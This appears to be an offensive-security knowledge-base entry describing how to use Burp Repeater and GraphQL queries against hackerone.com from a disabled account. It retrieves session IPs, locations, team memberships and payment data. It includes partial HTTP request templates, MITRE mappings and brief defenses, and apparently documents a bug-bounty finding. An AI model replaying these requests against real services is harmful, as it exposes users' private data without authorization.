---
tags:
  - data-exfiltration
  - sessions
  - graphql-query
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Collection]]'
commands:
  - '[[commands/graphql-sessions-query]]'
  - '[[commands/graphql-user-programs-query]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exfiltration Over Alternative Protocol]]'
updated_at: '2025-12-14T17:25:53.399Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
id: df41be0e-92cb-41cc-b4df-6a0323f5050d
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[Exfiltration Over Alternative Protocol]]'
---
# Execute-Sessions-Data-Retrieval

## Summary

Use custom GraphQL queries to retrieve sensitive user data such as session history, IP addresses, team memberships, and payment preferences from a disabled account.

## Description

Queries like Sessions_page and User_programs_settings_page return detailed info without UI access. This enables reconnaissance and potential further compromise.

## Requirements

1. Authenticated session token
2. Burp Repeater with base request
3. GraphQL query knowledge

## Defense

Defensive measures and detection strategies:

- Restrict query fields for disabled users
- Encrypt sensitive data in responses
- Audit API logs for unusual query patterns

## Objectives

1. Fetch session details including IPs and locations
2. Retrieve team and policy data
3. Collect payment and bounty info

## Instructions

### Step 1: Run Sessions Query

**Context**: Get session history.

Execute [[commands/graphql-sessions-query]] in Repeater.

```http
POST /graphql? HTTP/1.1
Host: hackerone.com
Content-Type: application/json
X-Auth-Token: [TOKEN]
Cookie: [COOKIES]

{"query":"query Sessions_page($first_0:Int!) {me {id,...F1}} fragment F0 on UserSession {id} ...","variables":{"first_0":10}}
```

> Output: JSON with sessions array, IPs, user agents, countries.

### Step 2: Run Programs Query

**Context**: Get team memberships.

Execute [[commands/graphql-user-programs-query]].

```http
POST /graphql? HTTP/1.1
Host: hackerone.com
...
{"query":"query User_programs_settings_page($first_0:Int!,$first_3:Int!,$size_1:ProfilePictureSizes!,$size_2:ProfilePictureSizes!) {me {id,...Fb}} ...","variables":{"first_0":500,"first_3":25,"size_1":"small","size_2":"medium"}}
```

> Output: Memberships, teams, subscriptions.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]] Collection

### Techniques

- [[Exfiltration Over Alternative Protocol]] Exfiltration Over Alternative Protocol

### Sub-Techniques


## Commands Used

- [[commands/graphql-sessions-query]]
- [[commands/graphql-user-programs-query]]

## Tools Used

- [[tools/Burp-Suite]]

## Tags

- session-retrieval
- team-data
